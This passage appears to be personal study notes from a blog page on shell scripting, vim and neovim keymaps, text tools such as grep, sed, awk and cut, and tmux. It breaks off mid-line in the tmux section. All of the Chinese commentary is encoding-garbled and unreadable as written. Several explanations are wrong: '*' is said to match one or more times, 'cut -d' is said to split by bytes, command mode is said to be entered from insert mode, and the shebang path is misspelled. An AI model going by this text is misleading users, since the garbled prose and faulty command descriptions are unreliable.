<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure>

<h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><p>shell, console, terminal?</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure>

<h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote>
<p>Linux è„šæœ¬çš„ä½¿ç”¨</p>
</blockquote>
<p>è¯­æ³•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$0</span>      è¿è¡Œæ–‡ä»¶å</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   å‚æ•°</span><br><span class="line">$?      è·å–ä¸Šä¸€ä¸ªè¿è¡Œçš„é”™è¯¯ 0ä»£è¡¨æ­£ç¡®ï¼Œ1ä»£è¡¨å‡ºé”™</span><br><span class="line"><span class="variable">$_</span>      å­˜å‚¨ä¸Šæ¬¡è¿è¡Œçš„ç»“æœ</span><br><span class="line"><span class="variable">$#</span>      å‚æ•°ä¸ªæ•°</span><br><span class="line">$$      è¿›ç¨‹<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      æ‰€æœ‰çš„å‚æ•°ç»„æˆï¼Œå¯è¿­ä»£</span><br><span class="line"></span><br><span class="line">!!      åœ¨æ‰§è¡Œæ—¶ä¼šæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"><span class="comment"># å˜é‡</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é‡èµ‹å€¼ä¸ºå‘½ä»¤çš„ç»“æœ</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>

<p>å¾ªç¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>æ¡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure>

<p>ç¼–ç¨‹è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŠ å…¥magic line æŒ‡å®šè§£æå™¨</span></span><br><span class="line"><span class="comment"># ä¸€ä¸ª ç§°ä¹‹ä¸º `shebang` çš„ä¸œè¥¿</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure>

<p><code>man</code> å‘½ä»¤çš„å…¶ä½™é€‰æ‹© <code>tldr</code> ï¼Œæ›´åŠ ç®€æ´(too long; donâ€™t read)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure>

<p>é€’å½’æŸ¥è¯¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find .     <span class="comment"># . ä»£è¡¨å½“å‰è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šæ¯”å¦‚ `/` </span></span><br><span class="line">	-name  <span class="comment"># åç§°,å¯ä»¥ä½¿ç”¨é€šé…ç¬¦</span></span><br><span class="line">	-<span class="built_in">type</span>  <span class="comment"># ç±»å‹ d(dir) f(file)</span></span><br><span class="line">	-mtime -1 <span class="comment"># ä¿®æ”¹æ—¶é—´modify timeï¼Œ 1æŒ‡1å¤©</span></span><br><span class="line">	-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># å¯¹äºå¯»æ‰¾çš„æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ \; ä¸å¯ç¼ºå°‘</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># æ›´åŠ ç°ä»£åŒ–çš„find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># é»˜è®¤æŸ¥æ‰¾æ•´ä¸ªè®¡ç®—æœº</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># åº”ç”¨äºæŸ¥æ–‡ä»¶å†…å®¹</span></span><br><span class="line">	-R  <span class="comment">#  é€’å½’</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure>


<p>æŸ¥æ‰¾ä½¿ç”¨è¿‡çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ–¹å‘é”®çš„ä¸Š</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh çš„ä¸€ä¸ªæ’ä»¶ï¼Œåœ¨è¾“å…¥æ—¶ä¼šæ˜¾ç¤ºæ›¾ç»è¾“å…¥çš„ç±»ä¼¼å‘½ä»¤</span><br></pre></td></tr></table></figure>


<p>æ›´æ¸…æ™°çš„ç›®å½•ç»“æ„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure>

<h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><p>vim</p>
<ul>
<li>normal mode: å¯ä»¥æ§åˆ¶å…‰æ ‡ï¼Œæ‰§è¡Œå‘½ä»¤â€¦</li>
<li>insert mode: å°±æ˜¯æ–‡æœ¬ç¼–è¾‘å™¨ã€‚</li>
<li>command mode: åœ¨insert mode è¾“å…¥ <code>:</code> åœ¨è¾“å…¥å‘½ä»¤</li>
<li>visual mode: æœ‰ç‚¹åƒä½¿ç”¨é¼ æ ‡é€‰ä¸­ä¸€å—è¿ç»­åŒºåŸŸ</li>
<li>replace mode</li>
</ul>
<p>è¿›å…¥ insert mode</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>ï¼Œ åœ¨å…‰æ ‡å‰æ’å…¥</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>ï¼Œåœ¨å…‰æ ‡å</span><br><span class="line">I   è¡Œé¦–</span><br><span class="line">A   è¡Œå°¾</span><br><span class="line"><span class="keyword">o</span>   ä¸‹ä¸€è¡Œ <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   ä¸Šä¸€è¡Œ</span><br></pre></td></tr></table></figure>

<p>normal mode</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">esc  ä¹Ÿå¯ä»¥è‡ªè¡Œé…ç½®</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ï¼Œé€€å‡º</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹ :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- åŠ å…¥ ! ä»£è¡¨å¼ºåˆ¶æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>normal mode å…‰æ ‡æ“ä½œã€‚</p>
<ul>
<li>æ‰€æœ‰çš„éƒ½å¯ä»¥åœ¨<code>å‰é¢åŠ ä¸€ä¸ªæ•°å­—</code>ï¼Œä»£è¡¨count</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">h   å·¦ç§»</span><br><span class="line"><span class="keyword">j</span>   ä¸‹</span><br><span class="line"><span class="keyword">k</span>   ä¸Š</span><br><span class="line"><span class="keyword">l</span>   å³</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   å‘å‰(åä¸€ä¸ªå•è¯)ç§»åŠ¨ä¸€ä¸ª word, ä¹Ÿå°±æ˜¯ä¸€ä¸ªå•è¯ï¼Œæ ‡ç‚¹æˆ–è€…ç©ºæ ¼åˆ†å¼€ã€‚åœ¨å•è¯ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line"><span class="keyword">b</span>   å‘backç§»åŠ¨ word      back of word</span><br><span class="line"><span class="keyword">e</span>   ç§»åŠ¨åˆ°å•è¯æœ«å°¾        end of word</span><br><span class="line"><span class="number">0</span>   ç§»åŠ¨åˆ°è¡Œé¦–</span><br><span class="line">$   è¡Œå°¾</span><br><span class="line">^   ä¸€è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>ç±»ä¼¼é¼ æ ‡å‘ä¸Šæ»šåŠ¨</span><br><span class="line">ctrl-d     down å‘ä¸‹</span><br><span class="line"></span><br><span class="line">H  highest  å±å¹•ç¬¬ä¸€è¡Œ</span><br><span class="line">L  low      å±å¹•æœ€åä¸€è¡Œ</span><br><span class="line">M  mid      å±å¹•ä¸­é—´ä¸€è¡Œ</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">d  åˆ é™¤ä¸€ä¸ªå­—ç¬¦,é…åˆç§»åŠ¨å…‰æ ‡ä½¿ç”¨</span><br><span class="line">	dd åˆ é™¤ä¸€è¡Œï¼Œå¯ä»¥ä½¿ç”¨<span class="keyword">p</span></span><br><span class="line">	D åˆ é™¤è‡³æœ«å°¾</span><br><span class="line">	d1G åˆ é™¤åˆ°ç¬¬ä¸€è¡Œ</span><br><span class="line">	dG  åˆ é™¤åˆ°æœ€åä¸€è¡Œ</span><br><span class="line">	n1, n2d åˆ é™¤n1-n2è¡Œ</span><br><span class="line">	-- åœ¨è¿™é‡Œ <span class="keyword">a</span> around;  i inside</span><br><span class="line">	<span class="keyword">di</span>(  åˆ é™¤æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">	da(  åˆ é™¤åŒ…æ‹¬æ‹¬å·çš„ä¸œè¥¿</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word åˆ é™¤(d ç±»ä¼¼)å¹¶è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   åˆ é™¤åé¢ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> åˆ é™¤åé¢numä¸ªå­—ç¬¦</span><br><span class="line">s   åˆ é™¤å­—ç¬¦è¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   åˆ é™¤ä¸€è¡Œè¿›å…¥<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure>

<p>å¤åˆ¶ç²˜è´´</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">	yy å¤åˆ¶å½“å‰è¡Œ</span><br><span class="line">	y1G ...</span><br><span class="line"><span class="keyword">p</span>   pasteåœ¨è¿™ä¸€è¡Œåé¢</span><br><span class="line"><span class="keyword">P</span>   è¿™ä¸€è¡Œå‰é¢</span><br></pre></td></tr></table></figure>

<p>è·³è½¬åˆ°æŸä¸€è¡Œ</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">g</span><br><span class="line">	gg ç¬¬ä¸€è¡Œ</span><br><span class="line">G   æœ€åä¸€è¡Œ</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span>G  è·³è½¬åˆ°numè¡Œ</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   è·³åˆ°ç¬¬numè¡Œ</span><br></pre></td></tr></table></figure>

<p>æ’¤é”€ä¹‹å‰çš„æ“ä½œ</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> æ¢å¤æ’¤é”€çš„å†…å®¹</span><br></pre></td></tr></table></figure>

<p>visual mode: å…è®¸æˆ‘ä»¬æ”¹å˜ä¸€åˆ—ï¼Œæ•´å—å¤åˆ¶ç­‰</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">v   å­—ç¬¦å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸä¸¤ä¸ªå­—ç¬¦ä¸­é—´æ‰€æœ‰å†…å®¹ï¼Œé€€å‡ºæŒ‰v</span><br><span class="line">V   è¡Œå¯è§†è¡Œï¼Œå…‰æ ‡æ‰€åœ¨è¡Œï¼Œé€€å‡º V</span><br><span class="line">ctrl+v   å—å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸå…‰æ ‡çš„çŸ©é˜µï¼Œé€€å‡ºctrl+v</span><br></pre></td></tr></table></figure>

<p>æœç´¢</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  æœ¬è¡ŒæŸ¥æ‰¾</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  æŸ¥å†…å®¹,å…¨æ–‡</span><br><span class="line">n      ç»§ç»­å‘ä¸‹ç»§ç»­æ‰¾ <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      ç»§ç»­å‘ä¸Šæ‰¾</span><br></pre></td></tr></table></figure>

<p>æ›´æ”¹ç¯å¢ƒ</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   æ˜¾ç¤ºè¡Œå·</span><br></pre></td></tr></table></figure>

<p><code>~</code> åè½¬å¤§å°å†™</p>
<p>æ‹¬å·åŒ¹é…</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">%   åˆ°åŒ¹é…çš„å¦ä¸€ä¸ªæ‹¬å·å¤„</span><br></pre></td></tr></table></figure>

<p>tab, window, buffer</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tab: æˆ‘ç†è§£ä¸º åœ¨ç³»ç»Ÿä¸­æ‰“å¼€vimè¿™ä¸ªè½¯ä»¶ä¸¤æ¬¡ï¼Œå°±æ˜¯ä¸¤ä¸ªtab</span><br><span class="line"></span><br><span class="line">window: vim å±å¹•ï¼Œå¯ä»¥åˆ†å±</span><br><span class="line"></span><br><span class="line">buffer: æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å…·æœ‰buffer, åŒä¸€ä¸ªæ–‡ä»¶åŒä¸€ä¸ªbuffer,å®æ—¶ã€‚</span><br></pre></td></tr></table></figure>

<p>é…ç½®ï¼Œvim åœ¨æ‰§è¡Œå‰ä¼šåŠ è½½ä¸€ä¸ª <code>~/.vimrc</code> æ–‡ä»¶ã€‚</p>
<ul>
<li>æˆ‘ä»¬å¯ä»¥DIYè‡ªå·±çš„å–œæ¬¢çš„æŒ‰é”®ã€‚</li>
<li>å®‰è£…æ’ä»¶å®ç°æ›´å¤šçš„åŠŸèƒ½</li>
</ul>
<h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><p><del>æœ¬äººä½¿ç”¨</del>(IDEä¸é¦™å—ï¼Ÿ) <a href="https://neovim.io/">neovim</a> é…åˆ <a href="https://www.lazyvim.org/">LazyVim</a>ã€‚å¯DIY. ç„¶åå† <code>VsCode</code> å®‰è£…neovimæ’ä»¶ï¼ŒåŒæ­¥ä½¿ç”¨ã€‚</p>
<ul>
<li>vimå¸¸ç”¨çš„æ“ä½œï¼Œneovimä¹Ÿèƒ½ç”¨ã€‚</li>
</ul>
<h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><p>Leader ä¸º space é”®ï¼ŒæŒºå¥½ç”¨, ä½¿ç”¨è¿™äº›åŠŸèƒ½ä¹Ÿéœ€è¦å®‰è£…å¯¹åº”æ’ä»¶</p>
<p>æ‰“å¼€ç»ˆç«¯</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    æ‰“å¼€å’Œå…³é—­</span><br></pre></td></tr></table></figure>

<p>å¿«é€Ÿæ³¨é‡Š</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    ä½†æ˜¯éœ€è¦æŒ‡å®šçš„ LSP</span><br></pre></td></tr></table></figure>

<p>ä¸åŒæ–‡ä»¶é—´(buffer)åˆ‡æ¢</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶æœç´¢ telescope</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- æ–‡ä»¶å</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> é€€å‡º</span><br><span class="line"></span><br><span class="line">-- æ–‡ä»¶å†…å®¹</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å†…</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> ä¿å­˜æ–‡ä»¶</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<p>åˆ†å±</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  ç”ŸåŠ¨è¡¨ç¤ºç«–ç€</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  æ¨ªç€</span><br><span class="line"></span><br><span class="line">-- åˆ‡æ¢ï¼Œå’Œ<span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹çš„ç§»åŠ¨è”ç³»</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> å·¦</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> ä¸‹</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> ä¸Š</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> å³</span><br></pre></td></tr></table></figure>

<p>ä¾§è¾¹æ  neo-tree</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- ä¾§è¾¹æ è¿›å…¥æ–‡ä»¶åï¼Œåœ¨è¿›å…¥ä¾§è¾¹æ </span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure>

<p>lazy.nvim æ’ä»¶ç®¡ç†éå¸¸å—æ¬¢è¿ã€‚ä½œè€…å¼€å‘çš„æ’ä»¶å’Œé…ç½®ã€‚</p>
<h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote>
<p>å¤„ç†æ•°æ®çš„æŸäº›æ‰‹æ®µ</p>
</blockquote>
<p>grepï¼Œæœç´¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">	-R  <span class="comment"># é€’å½’ï¼Œå¯ä»¥æŸ¥æ‰¾æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p>sedï¼Œåœ¨æœç´¢æ›¿æ¢æ˜¯ä¸€ä¸ªå¥½ç”¨çš„å·¥å…·ã€‚éœ€è¦å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: åŒ¹é…æ¨¡å¼ï¼Œæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">replace: å°†åŒ¹é…åˆ°çš„pattern è½¬æ¢ä¸º replaceã€‚å½“æ•è·æ—¶ \num ä»£è¡¨ç¬¬numä¸ªæ•è·ï¼Œæ‰“å°</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed é»˜è®¤æ”¯æŒå¾ˆè€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿ç”¨ `-E` å‚æ•°ï¼Œæ”¯æŒç°ä»£åŒ–çš„æ­£åˆ™</span></span><br></pre></td></tr></table></figure>

<p>ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ï¼Œä½¿ç”¨åœ¨çº¿ç½‘ç«™ç»ƒä¹ ã€‚regular expression</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[0-9]   0,1,2...9 å…¶ä¸­ä¸€ä¸ªæ•°å­—</span><br><span class="line">*       è´ªå©ªæ¨¡å¼ï¼Œ1æ¬¡æˆ–å¤šæ¬¡</span><br><span class="line">?       0 æˆ– 1 æ¬¡</span><br><span class="line">.       ä»»æ„å­—ç¬¦</span><br><span class="line">()      æ•è·æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">^ å¼€å¤´   $ æœ«å°¾</span><br></pre></td></tr></table></figure>

<p>wc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,ç»Ÿè®¡å¤§å° -l line å‡ è¡Œ</span><br></pre></td></tr></table></figure>

<p>æ’åºï¼Œå­—å…¸åºã€‚å»é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>    é»˜è®¤å­—å…¸åºæ’åº</span><br><span class="line">	-n æŒ‰ç…§æ•°å€¼çš„å¤§å°è¿›è¡Œæ’åº</span><br><span class="line">	-k æŒ‡å®šæ’åºçš„åˆ—æ•°</span><br><span class="line"><span class="built_in">uniq</span>    å¯å»é™¤é‡å¤å†…å®¹</span><br><span class="line">	-c  è®°å½•å‡ºç°æ¬¡æ•°</span><br></pre></td></tr></table></figure>

<p>awkï¼ŒåŸºäºæµçš„å¤„ç†ï¼Œæ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  æ‰§è¡Œä¸€ä¸ªè„šæœ¬</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">	-F  æŒ‡å®šåˆ†éš”ç¬¦</span><br></pre></td></tr></table></figure>

<p>cutï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„split</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">	-d   å­—èŠ‚ä¸ºå•ä½åˆ†å‰²  </span><br><span class="line">		<span class="built_in">cut</span> -d 3  ç¬¬ä¸‰ä¸ªå­—ç¬¦  -d 3-9,12  ç¬¬3-9,12ä¸ªå­—ç¬¦</span><br><span class="line">	-f   fields ä¸-dä¸€èµ·ä½¿ç”¨ï¼Œè¡¨ç¤ºåŒºåŸŸ</span><br><span class="line">		<span class="built_in">cut</span> -d : -f2  ç¬¬1-2ä¸ªå†’å·ä¹‹å‰çš„å†…å®¹</span><br><span class="line">	-c   character å­—ç¬¦ä¸ºå•ä½ï¼Œå¤„ç†ä¸­æ–‡å¥½ç”¨</span><br><span class="line">	-b   </span><br></pre></td></tr></table></figure>

<p>ç¼–ç¨‹è¯­è¨€åœ¨å‘½ä»¤è¡Œçš„ä½¿ç”¨? å„ç§ç®¡é“ï¼Œå›¾ç‰‡éŸ³é¢‘å¤„ç†? </p>
<h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote>
<p>ä¼˜é›…çš„ä½¿ç”¨å‘½ä»¤è¡Œ</p>
</blockquote>
<h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><p>Linux ç³»ç»Ÿçš„ signalæœºåˆ¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man signal : ä¼šçœ‹åˆ°ä¸åŒçš„number å’Œ name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure>

<p>ctrl+z</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æš‚åœï¼Œå¯æ‰§è¡Œå…¶ä»–ä»»åŠ¡</span></span><br><span class="line">&amp;     åœ¨å‘½ä»¤ååŠ å…¥ï¼Œè¡¨ç¤ºåå°æ‰§è¡Œ</span><br><span class="line"><span class="built_in">jobs</span>  æŸ¥çœ‹åå°ä»»åŠ¡ï¼Œæš‚åœæˆ–è€…è¿è¡Œ pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  ä½¿æš‚åœçš„ä»»åŠ¡ç»§ç»­è¿è¡Œï¼Œ<span class="built_in">fg</span> æ¢å¤åˆ°å‰å°ã€‚<span class="built_in">bg</span> æ¢å¤åˆ°åå°æ‰§è¡Œã€‚front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            åœæ­¢</span><br></pre></td></tr></table></figure>

<h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul>
<li><p>ç»ˆç«¯å¤ç”¨ï¼Œåœ¨ä¸€ä¸ªterminal windowå¹²å¾ˆå¤šäº‹æƒ…ã€‚</p>
</li>
<li><p>å¾ˆå¤šçš„ç»ˆç«¯éƒ½å­˜åœ¨åˆ†å±ç­‰æ“ä½œï¼Œä½†æ˜¯è¯¾ç¨‹ä»‹ç»ç¥å™¨ <code>tmux</code>ï¼Œæ›´åŠ ç¥å¥‡ã€‚</p>
<ul>
<li>ä¸ kill sessionï¼Œå…¶ä¸­çš„å‘½ä»¤ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚åªéœ€è¦å¼€å¯ä¸€æ¬¡ç»ˆç«¯ã€‚</li>
<li>åœ¨ssh æœåŠ¡å™¨æ—¶éå¸¸çš„å¥½ç”¨</li>
</ul>
</li>
<li><p>session, window, pune</p>
<ul>
<li>å¯åŠ¨tmux, ä¼šå¼€å¯ä¸€ä¸ªsession, æ˜æ˜¾çš„æ˜¯ä¸‹é¢ä¼šå‡ºç°ä¸€è¡Œæ•°æ®ã€‚</li>
<li>window åˆ›å»ºä¸€ä¸ªæ–°çš„shell ç»ˆç«¯ã€‚</li>
<li>pune é¢æ¿ï¼Œä¸€ä¸ªçª—å£å¯ä»¥åˆ†å¾ˆå¤šçš„é¢æ¿ã€‚</li>
</ul>
</li>
</ul>
<p>å‘½ä»¤è¡Œæ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tmux</span><br><span class="line">	ä¸‹éƒ¨ä¼šå‡ºç°çŠ¶æ€æ ï¼Œåˆ†åˆ«æ˜¯session window1 windiow2...     æ—¶é—´ç­‰</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach è¿›å…¥session</span></span><br><span class="line">		-t name  æŒ‡å®šåç§°</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       åˆ›å»ºå¹¶æŒ‡å®šåç§°</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  æ€æ­»æŒ‡å®šçš„session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   æŸ¥çœ‹æ‰€æœ‰çš„session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane æ¨ªç«–åˆ†å‰²window</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤å¿«æ·é”®ã€‚å¯ä»¥å…ˆæŒ‰ä¸€ä¸‹ <code>ctrl-b</code> åœ¨æŒ‰å…¶ä½™çš„ï¼Œä¸éœ€è¦åŒæ—¶æŒ‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   åˆ—å‡ºæ‰€æœ‰session vimå¿«æ·é”®ä¸‹çš„é€‰æ‹©</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; ç¬¬nä¸ªçª—å£,næ˜¯ä¸ªæ•°å­—</span><br><span class="line">prefix w   åˆ—å‡ºwindow å’Œ session(s ?),  jk é€‰æ‹©ï¼Œenterè¿›å…¥</span><br><span class="line">prefix ,   é‡å‘½å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       